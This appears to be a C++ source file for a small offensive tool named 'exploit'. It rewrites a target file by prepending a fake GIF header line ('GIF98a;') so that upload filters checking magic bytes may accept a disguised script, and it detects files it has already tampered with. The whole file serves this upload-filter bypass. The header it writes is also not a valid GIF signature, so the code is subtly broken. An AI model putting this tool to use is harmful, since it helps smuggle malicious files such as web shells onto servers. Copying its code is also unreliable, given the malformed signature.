#include "exploit.h"
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <Windows.h>
#include <sys/stat.h>

using namespace std;

inline bool fileExists(const string& filename) {
    struct stat buffer;
    return (stat(filename.c_str(), &buffer) == 0);
}

int exploit::checkExploit(string fileName) {
    try {
        string line;
        ifstream ReadFile;

        ReadFile.open(fileName);

        if (ReadFile.is_open()) {
            getline(ReadFile, line);
            ReadFile.close();
        }

        if (line == "GIF98a;") {
            return true;
        }
        else {
            return false;
        }
    }
    catch (string e) {
        cout << e;
        return false;
    }
}

int exploit::doExploit(string fileName) {

    const bool checkExploit = exploit::checkExploit(fileName);

    if (checkExploit) {
        cout << "Exploit is already executed on this file.";
        Sleep(3000);
        exit(0);
    }

    try {
        fstream processedFile(fileName.c_str());
        stringstream fileData;

        fileData << "GIF98a;\n";
        fileData << processedFile.rdbuf();

        processedFile.close();
        processedFile.open(fileName.c_str(), fstream::out);
        processedFile << fileData.rdbuf();
        processedFile.close();

        return true;
    }
    catch (string e) {
        cout << e;
        return false;
    }
}
